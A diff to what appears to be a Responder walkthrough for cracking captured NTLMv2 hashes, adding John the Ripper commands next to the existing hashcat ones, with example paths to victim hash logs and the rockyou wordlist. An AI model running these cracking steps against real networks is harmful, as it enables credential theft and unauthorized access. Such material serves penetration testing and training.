@@ -36,13 +36,21 @@ Each captured hash looks like:
 
 Step 4 - Crack the hash offline
 
-Use hashcat with mode 5600 (NTLMv2):
+Option A - hashcat (faster, needs GPU):
 
     hashcat -m 5600 <hash-file> <wordlist> --force
 
-Example with rockyou:
+Option B - John the Ripper (CPU-based, no GPU needed):
+
+    john --format=netntlmv2 --wordlist=<wordlist> <hash-file>
+
+Example with rockyou (hashcat):
     hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-<victim-ip>.txt \
             /usr/share/wordlists/rockyou.txt --force
+
+Example with rockyou (john):
+    john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt \
+         /usr/share/responder/logs/SMB-NTLMv2-SSP-<victim-ip>.txt
 
 
 Step 5 - Stop Responder
